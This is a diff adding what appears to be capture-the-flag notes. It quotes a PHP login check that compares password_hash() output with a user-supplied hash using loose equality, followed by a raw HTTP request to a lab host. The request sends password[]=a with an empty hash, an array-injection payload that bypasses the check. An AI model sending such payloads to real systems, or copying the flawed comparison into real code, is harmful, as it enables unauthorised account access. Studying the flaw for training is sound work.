@@ -1,0 +1,29 @@
+# Target
+8092/tcp open  http        Apache httpd 2.4.38 ((Debian))
+
+
+$options = [
+    'salt' => *secret*,
+    'cost' => 12
+];
+if (password_hash($_POST['password'], PASSWORD_DEFAULT, $options) == $_POST['hash'] ){
+    *success code goes here to send the challenge card back to the user*
+}
+
+
+POST /login.php HTTP/1.1
+Host: 172.15.27.21:8092
+Content-Length: 29
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://172.15.27.21:8092
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://172.15.27.21:8092/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: SESSION=gASVJAAAAAAAAAB9lIwGZmlsdGVylIwUcmVmX25hbWUgPX4gIl5zcG9vZiKUcy4=
+Connection: close
+
+user=admin&password[]=a&hash=
